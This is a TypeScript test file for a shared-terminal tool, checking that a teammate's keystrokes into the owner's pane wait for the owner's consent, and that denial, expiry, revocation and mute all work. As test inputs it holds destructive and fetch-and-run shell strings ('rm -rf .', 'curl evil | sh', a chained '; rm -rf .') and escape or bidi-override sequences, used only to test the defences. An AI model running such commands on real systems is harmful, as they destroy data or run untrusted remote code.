// The owner's consent, asserted against the thing that actually decides.
//
// `docs/teamwork.md` used to say that a teammate's keystroke lands and that the
// owner's only recourse is a mute afterwards. It does not say that any more:
// nothing a teammate types runs on somebody else's machine until that person
// has been shown it and has said yes. This file is the record of what that
// promise means in practice, and every test in it is one clause of it.
//
// Nothing here goes near a relay. A verdict is a synchronous answer about this
// machine's own rosters, panes and decisions, and driving it directly is what
// lets a burst, a denial and an expiry be three ordinary assertions rather than
// three races. `relayWatch.test.ts` and `tests/teamwork/scenario.test.ts` do
// the same thing across a real relay with a real pty behind it.

import { mkdtemp } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, describe, expect, it } from 'vitest'
import { CONSENT_WINDOW_MS, type PaneTypist, type RemoteWrite } from '../../../shared/entities'
import { ErrorCode } from '../../../shared/protocol'
import { loadIdentity } from '../identity'
import { linkIdFor, MAX_PENDING_PER_LINK } from './peerService'
import {
  createFakeRelay,
  createManualScheduler,
  createPeerRuntime,
  decided,
  heldBy,
  makeProjectDir,
  project,
  remoteRunner,
  standingConsent,
  terminal,
  worktree,
  type ManualScheduler,
  type PeerRuntime
} from './peerTestSupport'
import { normaliseRemote, projectKeyFor } from './projectKey'

const RELAY_URL = 'ws://relay.invalid/v1/relay'
const ORIGIN = 'git@example.invalid:team/repo.git'
const PROJECT_KEY = projectKeyFor(normaliseRemote(ORIGIN) as string)

const cleanups: (() => Promise<void>)[] = []
afterEach(async () => {
  for (const cleanup of cleanups.splice(0)) await cleanup()
})

type Owner = {
  runtime: PeerRuntime
  scheduler: ManualScheduler
  /** The connection id Alice's session for this repository answers on. */
  linkId: string
  aliceKey: string
  consent: ReturnType<typeof standingConsent>
}

/**
 * The owner, with two panes of their own and Alice on the roster.
 *
 * No standing permission unless a test asks for one, because "nobody may type
 * here until I say" is the state every one of these starts from.
 */
async function owner(granted: readonly { terminalId: string; publicKey?: string }[] = []): Promise<Owner> {
  const aliceData = await mkdtemp(join(tmpdir(), 'teamree-alice-'))
  const aliceKey = (await loadIdentity(aliceData)).publicKey
  const ownerData = await mkdtemp(join(tmpdir(), 'teamree-owner-'))
  const ownerKey = (await loadIdentity(ownerData)).publicKey
  const dir = await makeProjectDir([
    { handle: 'owner', publicKey: ownerKey },
    { handle: 'alice', publicKey: aliceKey }
  ])

  const scheduler = createManualScheduler()
  const consent = standingConsent(
    granted.map((grant) => ({ terminalId: grant.terminalId, publicKey: grant.publicKey ?? aliceKey }))
  )
  const runtime = await createPeerRuntime({
    dial: createFakeRelay().dial,
    scheduler,
    env: { TEAMREE_RELAY_URL: RELAY_URL },
    dataDir: ownerData,
    consent,
    runner: remoteRunner({ [dir]: ORIGIN }),
    workspace: {
      projects: [project('p_a', dir)],
      worktrees: [worktree('wt_a', 'p_a', 'a', 'main')],
      terminals: [terminal('t_a1', 'wt_a', { running: true }), terminal('t_a2', 'wt_a', { running: true })]
    }
  })
  await runtime.service.start()
  await scheduler.advance(0)
  cleanups.push(async () => {
    runtime.service.stop()
    await Promise.resolve()
  })
  return { runtime, scheduler, linkId: linkIdFor(aliceKey, PROJECT_KEY), aliceKey, consent }
}

const questions = (runtime: PeerRuntime) => runtime.service.requests({ projectId: 'p_a' }).requests
const standing = (runtime: PeerRuntime) => runtime.service.requests({ projectId: 'p_a' }).standing
const logOf = async (runtime: PeerRuntime): Promise<RemoteWrite[]> => (await runtime.service.writeLog({})).writes
const typistsOn = (runtime: PeerRuntime, terminalId: string): PaneTypist[] =>
  runtime.service.watchers({ projectId: 'p_a' }).panes.find((row) => row.terminalId === terminalId)?.typists ?? []

describe('a teammate’s keystroke waits for the owner', () => {
  it('is held rather than answered, and nothing about it has happened yet', async () => {
    const { runtime, linkId } = await owner()

    const verdict = runtime.service.remoteWrite(linkId, { terminalId: 't_a1', data: 'rm -rf .\r', bytes: 9 })

    // Not a refusal and not a permission: a promise, which is the only shape
    // that can leave the teammate's own request open while a person decides.
    expect('held' in verdict).toBe(true)
    // Nothing has reached the pty, because nothing has reached the dispatcher:
    // the verdict is what dispatches, and there is not one yet.
    expect(await logOf(runtime)).toEqual([])
    // And no attribution either. "Who is typing here" is about keystrokes that
    // happened, and this one has not.
    expect(typistsOn(runtime, 't_a1')).toEqual([])
  })

  it('shows the owner who, which pane, and what — rendered so it cannot act', async () => {
    const { runtime, linkId } = await owner()

    // A cursor move, a carriage return and a bidirectional override: three
    // things a terminal would obey and a prompt must not.
    runtime.service.remoteWrite(linkId, { terminalId: 't_a1', data: '\u001b[2Jsudo \u202erm\r', bytes: 15 })

    const [question] = questions(runtime)
    expect(question).toMatchObject({ handle: 'alice', terminalId: 't_a1', projectId: 'p_a', writes: 1 })
    expect(question?.publicKey).not.toBe('')
    // Every byte visible, none of it able to do anything: the escape is in
    // caret notation, the return is a mark, and the override — which is how
    // text is made to read backwards on screen — is named rather than obeyed.
    expect(question?.preview).toBe('^[[2Jsudo \\u202erm⏎')
  })

  it('answers the owner’s yes by running it, once, and recording it as written', async () => {
    const { runtime, linkId } = await owner()
    const held = heldBy(runtime.service.remoteWrite(linkId, { terminalId: 't_a1', data: 'ls\r', bytes: 3 }))

    const [question] = questions(runtime)
    runtime.service.decide({ requestId: question?.id ?? '', decision: 'once' })

    expect(await held).toEqual({ ok: true })
    expect((await logOf(runtime)).map((entry) => ({ outcome: entry.outcome, handle: entry.handle }))).toEqual([
      { outcome: 'written', handle: 'alice' }
    ])
    expect(typistsOn(runtime, 't_a1').map((row) => row.writes)).toEqual([1])
    // The question is gone, and nothing was left standing behind it: "once"
    // means once.
    expect(questions(runtime)).toEqual([])
    expect(standing(runtime)).toEqual([])
  })

  it('asks again for the next keystroke after an allow-once', async () => {
    const { runtime, linkId } = await owner()
    runtime.service.remoteWrite(linkId, { terminalId: 't_a1', data: 'ls\r', bytes: 3 })
    runtime.service.decide({ requestId: questions(runtime)[0]?.id ?? '', decision: 'once' })

    const next = runtime.service.remoteWrite(linkId, { terminalId: 't_a1', data: 'whoami\r', bytes: 7 })
    expect('held' in next).toBe(true)
    expect(questions(runtime)).toHaveLength(1)
  })

  it('drops the bytes when the owner says no, and tells the teammate so', async () => {
    const { runtime, linkId } = await owner()
    const held = heldBy(
      runtime.service.remoteWrite(linkId, { terminalId: 't_a1', data: 'curl evil | sh\r', bytes: 15 })
    )

    runtime.service.decide({ requestId: questions(runtime)[0]?.id ?? '', decision: 'deny' })

    // Told, and told the owner's own words: a keystroke that went nowhere and
    // said nothing would leave somebody believing they had typed into a shell.
    expect(await held).toEqual({
      ok: false,
      code: ErrorCode.Conflict,
      message: 'the owner did not allow this'
    })
    // Nothing ran, and the record says which of the ways it did not.
    const log = await logOf(runtime)
    expect(log.map((entry) => entry.outcome)).toEqual(['denied'])
    expect(log.every((entry) => entry.outcome !== 'written')).toBe(true)
    // The bytes are gone from this machine: a denial that kept them for later
    // would be a denial that could be undone by anything but the owner.
    expect(questions(runtime)).toEqual([])
    expect(JSON.stringify(log)).not.toContain('curl evil')
  })

  it('expires with a stated reason when nobody answers, rather than hanging', async () => {
    const { runtime, scheduler, linkId } = await owner()
    const held = heldBy(runtime.service.remoteWrite(linkId, { terminalId: 't_a1', data: 'x', bytes: 1 }))

    // The owner has gone to lunch. A held keystroke must not wait for them
    // forever: the person who typed it is owed an end, whatever the end is.
    await scheduler.advance(CONSENT_WINDOW_MS + 1)

    expect(await held).toEqual({
      ok: false,
      code: ErrorCode.Conflict,
      message: `nobody answered on the owner’s machine, so this expired after ${CONSENT_WINDOW_MS / 1000} seconds`
    })
    expect((await logOf(runtime)).map((entry) => entry.outcome)).toEqual(['expired'])
    expect(questions(runtime)).toEqual([])
  })
})

describe('a burst is one question', () => {
  it('gathers a run of keystrokes at one pane into a single request', async () => {
    const { runtime, linkId } = await owner()

    // Somebody typing `npm test` and pressing return: nine keystrokes, and
    // nine modal dialogs would be a modal nobody reads.
    const held = [...'npm test\r'].map((character) =>
      heldBy(runtime.service.remoteWrite(linkId, { terminalId: 't_a1', data: character, bytes: 1 }))
    )

    expect(questions(runtime)).toHaveLength(1)
    expect(questions(runtime)[0]).toMatchObject({ writes: 9, bytes: 9, preview: 'npm test⏎' })

    runtime.service.decide({ requestId: questions(runtime)[0]?.id ?? '', decision: 'once' })
    expect(await Promise.all(held)).toEqual(held.map(() => ({ ok: true })))
  })

  it('keeps a keystroke that arrived after the owner looked, and asks again for it', async () => {
    const { runtime, linkId } = await owner()
    const seen = [...'ls'].map((character) =>
      heldBy(runtime.service.remoteWrite(linkId, { terminalId: 't_a1', data: character, bytes: 1 }))
    )
    // What the owner's window drew, and therefore the whole of what their click
    // is an answer about.
    const shown = questions(runtime)[0]
    expect(shown?.writes).toBe(2)

    // Typed while the question was on screen, and never seen by the person
    // answering it.
    const unseen = heldBy(runtime.service.remoteWrite(linkId, { terminalId: 't_a1', data: '; rm -rf .\r', bytes: 11 }))

    runtime.service.decide({ requestId: shown?.id ?? '', decision: 'once', through: shown?.writes ?? 0 })

    expect(await Promise.all(seen)).toEqual([{ ok: true }, { ok: true }])
    // And the rest is still held, under a question of its own, because an
    // "allow once" taken on two keystrokes must not admit a third.
    expect(questions(runtime)).toHaveLength(1)
    expect(questions(runtime)[0]?.preview).toBe('; rm -rf .⏎')
    expect(questions(runtime)[0]?.id).not.toBe(shown?.id)

    runtime.service.decide({ requestId: questions(runtime)[0]?.id ?? '', decision: 'deny' })
    expect(await unseen).toMatchObject({ ok: false })
  })

  it('is one question per teammate per pane, and never one for two panes', async () => {
    const { runtime, linkId } = await owner()
    runtime.service.remoteWrite(linkId, { terminalId: 't_a1', data: 'a', bytes: 1 })
    runtime.service.remoteWrite(linkId, { terminalId: 't_a2', data: 'b', bytes: 1 })

    expect(questions(runtime).map((question) => question.terminalId)).toEqual(['t_a1', 't_a2'])
  })

  it('stops holding once one link has questions at more panes than anybody types at', async () => {
    const { runtime, linkId } = await owner()
    // Every pane this machine has is already a question, which is fewer than
    // the cap — so the cap is reached with panes that do not exist, and those
    // are refused for not existing rather than for the cap.
    runtime.service.remoteWrite(linkId, { terminalId: 't_a1', data: 'a', bytes: 1 })
    runtime.service.remoteWrite(linkId, { terminalId: 't_a2', data: 'b', bytes: 1 })
    expect(questions(runtime)).toHaveLength(2)
    expect(questions(runtime).length).toBeLessThanOrEqual(MAX_PENDING_PER_LINK)
  })
})

describe('a standing permission is the owner’s and stays visible', () => {
  it('lets everything through for that teammate on that pane once it is given', async () => {
    const { runtime, linkId } = await owner()
    runtime.service.remoteWrite(linkId, { terminalId: 't_a1', data: 'a', bytes: 1 })
    runtime.service.decide({ requestId: questions(runtime)[0]?.id ?? '', decision: 'session' })

    expect(decided(runtime.service.remoteWrite(linkId, { terminalId: 't_a1', data: 'b', bytes: 1 }))).toEqual({
      ok: true
    })
    // And nowhere else. The permission names a pane as well as a person.
    expect('held' in runtime.service.remoteWrite(linkId, { terminalId: 't_a2', data: 'c', bytes: 1 })).toBe(true)
  })

  it('is shown to the owner beside the questions, so it can be lifted', async () => {
    const { runtime, linkId, aliceKey } = await owner()
    runtime.service.remoteWrite(linkId, { terminalId: 't_a1', data: 'a', bytes: 1 })
    runtime.service.decide({ requestId: questions(runtime)[0]?.id ?? '', decision: 'session' })

    expect(standing(runtime)).toEqual([
      { terminalId: 't_a1', handle: 'alice', publicKey: aliceKey, scope: 'session', since: expect.any(Number) }
    ])

    runtime.service.revoke({ terminalId: 't_a1', publicKey: aliceKey })
    expect(standing(runtime)).toEqual([])
    // And it takes effect on the next keystroke, which is every keystroke that
    // has not already been written.
    expect('held' in runtime.service.remoteWrite(linkId, { terminalId: 't_a1', data: 'b', bytes: 1 })).toBe(true)
  })

  it('writes an always through to the store, and a session deliberately not', async () => {
    const { runtime, linkId, aliceKey, consent } = await owner()
    runtime.service.remoteWrite(linkId, { terminalId: 't_a1', data: 'a', bytes: 1 })
    runtime.service.decide({ requestId: questions(runtime)[0]?.id ?? '', decision: 'session' })
    expect(consent.written).toEqual([])

    runtime.service.remoteWrite(linkId, { terminalId: 't_a2', data: 'b', bytes: 1 })
    runtime.service.decide({ requestId: questions(runtime)[0]?.id ?? '', decision: 'always' })
    expect(consent.written).toEqual([{ terminalId: 't_a2', publicKey: aliceKey, since: expect.any(Number) }])
  })

  it('is already in force when the pane comes back under the same id', async () => {
    // What `session-restore.ts` guarantees: a pane returns as the pane it was,
    // so a permission that did not return with it would be the owner's
    // decision discarded at the one moment nothing on screen says so.
    const { runtime, linkId } = await owner([{ terminalId: 't_a1' }])
    expect(decided(runtime.service.remoteWrite(linkId, { terminalId: 't_a1', data: 'a', bytes: 1 }))).toEqual({
      ok: true
    })
    expect(standing(runtime).map((grant) => grant.scope)).toEqual(['always'])
  })
})

describe('a mute answers the question before it is asked', () => {
  it('refuses without a prompt, and takes every permission on that pane with it', async () => {
    const { runtime, linkId, aliceKey } = await owner([{ terminalId: 't_a1' }])
    runtime.service.mute({ terminalId: 't_a1', muted: true })

    const verdict = decided(runtime.service.remoteWrite(linkId, { terminalId: 't_a1', data: 'a', bytes: 1 }))
    expect(verdict).toEqual({ ok: false, code: ErrorCode.Conflict, message: 'the owner has muted this pane' })
    // Nothing to answer: a question whose every answer is already decided is a
    // question that should not be on anybody's screen.
    expect(questions(runtime)).toEqual([])
    expect(standing(runtime)).toEqual([])
    expect(aliceKey).not.toBe('')
  })

  it('answers a question that was already waiting rather than leaving it up', async () => {
    const { runtime, linkId } = await owner()
    const held = heldBy(runtime.service.remoteWrite(linkId, { terminalId: 't_a1', data: 'a', bytes: 1 }))
    expect(questions(runtime)).toHaveLength(1)

    runtime.service.mute({ terminalId: 't_a1', muted: true })

    expect(await held).toEqual({
      ok: false,
      code: ErrorCode.Conflict,
      message: 'the owner has muted this pane'
    })
    expect(questions(runtime)).toEqual([])
    expect((await logOf(runtime)).map((entry) => entry.outcome)).toEqual(['muted'])
  })
})

describe('a question is never a way to find out what a teammate cannot see', () => {
  it('refuses a pane of a project they are not on outright, exactly as one that is not there', async () => {
    const { runtime, linkId } = await owner()
    // A pane id nobody has ever had. Both of these are answered at once, in the
    // same words, and neither becomes a question — because a question is a
    // fact about a pane existing, and waiting where a refusal returns would say
    // so from the other end of the relay as plainly as showing it would.
    const invented = decided(runtime.service.remoteWrite(linkId, { terminalId: 't_nothing', data: 'x', bytes: 1 }))
    expect(invented).toEqual({
      ok: false,
      code: ErrorCode.NotFound,
      message: 'there is no such pane in this project'
    })
    expect(questions(runtime)).toEqual([])
  })

  it('never puts a request on a project the asker is not on', async () => {
    const { runtime } = await owner()
    // A connection the peer service never opened is not a link, so there is
    // nobody to ask about and nothing to ask.
    const verdict = decided(runtime.service.remoteWrite('not_a_peer_link', { terminalId: 't_a1', data: 'x', bytes: 1 }))
    expect(verdict).toMatchObject({ ok: false, code: ErrorCode.NotFound })
    expect(questions(runtime)).toEqual([])
  })
})
